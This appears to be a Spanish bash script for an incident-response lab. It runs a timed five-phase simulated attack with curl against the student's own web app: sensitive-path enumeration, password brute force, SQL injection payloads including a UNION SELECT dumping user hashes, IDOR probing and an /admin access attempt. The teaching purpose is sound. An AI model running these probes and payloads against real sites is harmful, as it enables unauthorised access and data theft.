#!/usr/bin/env bash
# Simulacro de ataque contra TU web (miweb), para la práctica de IC del 18/11.
#
# Se lanza desde TU Kali contra TU Ubuntu por la red solo-anfitrión:
#   bash ataque-simulado.sh                         (objetivo http://192.168.56.1:8080)
# Plan B, desde el propio Ubuntu (en los registros la IP será 127.0.0.1):
#   OBJETIVO=http://127.0.0.1:8080 bash ataque-simulado.sh
#
# Solo usa curl. Hace cinco fases con una pausa entre ellas y apunta la hora de
# cada una en horas-ataque.txt. No lo lances nunca contra otra web que no sea la tuya.
set -euo pipefail

OBJETIVO=${OBJETIVO:-http://192.168.56.1:8080}
OBJETIVO=${OBJETIVO%/}
VICTIMA=${VICTIMA:-marcos}           # usuario de ejemplo de miweb
CLAVE_BUENA=${CLAVE_BUENA:-Marcos.2026}
ESPERA=${ESPERA:-pregunta}           # pregunta = pulsa Intro entre fases; un número = segundos
HORAS=horas-ataque.txt
TARRO=$(mktemp)
trap 'rm -f "$TARRO"' EXIT

AGENTE="Mozilla/5.0 (X11; Linux x86_64) simulacro-IC"
pedir() { curl -s -o /dev/null -w '%{http_code}' -A "$AGENTE" -b "$TARRO" -c "$TARRO" "$@"; }

fase() {
    local n=$1; shift
    if [[ $n -gt 1 ]]; then
        if [[ $ESPERA == pregunta ]]; then
            read -r -p "Pulsa Intro para empezar la fase $n... " _
        else
            sleep "$ESPERA"
        fi
    fi
    local linea
    linea="Fase $n · $* · local $(date '+%Y-%m-%d %H:%M:%S %z') · UTC $(date -u '+%Y-%m-%d %H:%M:%S')"
    echo
    echo "== $linea"
    echo "$linea" >> "$HORAS"
}

echo "Objetivo: $OBJETIVO"
if [[ "$(pedir "$OBJETIVO/salud")" != 200 ]]; then
    echo "ERROR: no llego a $OBJETIVO/salud. Comprueba la red y que miweb está en marcha." >&2
    exit 1
fi
echo "--- simulacro $(date '+%Y-%m-%d') contra $OBJETIVO" >> "$HORAS"

fase 1 "Enumeración de rutas"
for ruta in admin backup backup.zip .git/HEAD .env config.php wp-login.php phpmyadmin/ \
            server-status robots.txt api api/v1/usuarios old test debug consola \
            uploads db.sqlite datos/miweb.db login.php panel; do
    printf '%s %s\n' "$(pedir "$OBJETIVO/$ruta")" "/$ruta"
done

fase 2 "Fuerza bruta contra el usuario $VICTIMA"
for clave in 123456 password marcos marcos123 Marcos2026 qwerty admin Marcos.2025 "$CLAVE_BUENA"; do
    codigo=$(pedir -d "nombre=$VICTIMA" --data-urlencode "clave=$clave" "$OBJETIVO/login")
    printf '%s probando %s\n' "$codigo" "$clave"
    if [[ $codigo == 302 ]]; then
        echo "   ¡Contraseña encontrada! Sesión abierta como $VICTIMA."
        break
    fi
    sleep 1
done

fase 3 "Inyección SQL en /buscar"
for q in "'" "x' OR '1'='1" "zz' UNION SELECT id,nombre,hash,rol FROM usuarios-- "; do
    printf '%s %s\n' "$(pedir -G --data-urlencode "q=$q" "$OBJETIVO/buscar")" "q=$q"
    sleep 1
done

fase 4 "Reservas de otros usuarios (IDOR)"
for id in 1 2 3 4 5; do
    printf '%s /reservas/%s\n' "$(pedir "$OBJETIVO/reservas/$id")" "$id"
done

fase 5 "Intento de entrar en /admin"
printf '%s /admin\n' "$(pedir "$OBJETIVO/admin")"

echo
echo "Fin del simulacro: $(date '+%H:%M:%S'). Las horas de cada fase están en $HORAS"
